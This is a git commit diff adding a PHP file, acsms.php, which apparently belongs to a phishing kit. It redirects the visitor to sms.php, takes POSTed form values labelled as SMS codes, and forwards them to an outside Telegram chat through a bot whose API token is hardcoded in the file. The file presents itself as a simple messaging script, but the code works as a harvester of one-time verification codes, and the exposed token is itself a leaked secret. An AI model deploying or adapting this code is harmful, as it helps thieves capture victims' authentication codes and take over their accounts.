26d5045b5b6c3e910491d62e539949ab0a01f1fb
gerebeg <116833041+gerebeg@users.noreply.github.com>
2022-11-04 15:23:33 +0700

    Update acsms.php

--- public/acsms.php
+++ public/acsms.php
@@ -1,1 +1,36 @@
+<?php
+header('location: sms.php');
+?>
+<?php
+/* -----------------------------------------------------
+Simple PHP script for Sending Telegram Bot Message
+~ Iky | https://www.wadagizig.com
+------------------------------------------------------ */
 
+function sendMessage($telegram_id, $message_text, $secret_token) {
+
+    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message_text);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+
+/*----------------------
+only basic POST method :
+-----------------------*/
+$telegram_id = $_POST ['telegram_id'];
+$message_text ="Code SMS >> "."Sms Code: ".$_POST ['message_text'];
+
+/*--------------------------------
+Isi TOKEN dibawah ini: 
+--------------------------------*/
+$secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
+sendMessage($telegram_id, $message_text, $secret_token);
+
+?>
